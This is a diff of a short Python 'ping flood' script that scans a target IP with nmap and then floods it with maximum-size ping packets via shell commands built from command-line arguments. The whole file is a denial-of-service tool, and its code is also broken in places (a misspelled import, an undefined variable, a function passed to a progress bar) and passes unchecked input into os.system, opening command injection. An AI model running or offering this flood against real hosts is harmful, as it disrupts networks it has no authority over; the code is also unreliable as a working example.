@@ -1,22 +1,33 @@
-from time import sleep
-import os
+import os, sys, art, time
+from tdqm import trange
+from colorama import Fore
 
 def in_sudo_mode():
     if not 'SUDO_UID' in os.environ.keys():
         print("Try running this program with sudo.")
-        exit()
+        sys.exit()
+
+def load():
+    # loading screen
+    time.sleep(0.5)
         
 def main():
-    ps = input("enter packet size (enter 0 for maximum) >>> ")
-    sleep(1)
-    ip = input("enter ip address >>> ")
-    os.system("nmap {ip}")
-    sleep(1)
+    # ui
+    for i in trange(load):
+        load()
+    
+    banner = art.text2art("ping flood", font="small")
+    print(f"{rand}{banner}")
+    
+    # variables
+    ip = sys.argv[1]
+    ps = sys.argv[2]
+    
+    # scan
+    os.system(f"nmap {ip}")
     if ps == "0":
-        os.system("ping -s 65507 -f {ip}")    
+        os.system(f"ping -s 65507 -f {ip}")    
     else:
-        os.system("ping -s {ps} -f {ip}")
+        os.system(f"ping -s {ps} -f {ip}")
         
-        
-if __name__ == "main":
-    main()
+main()
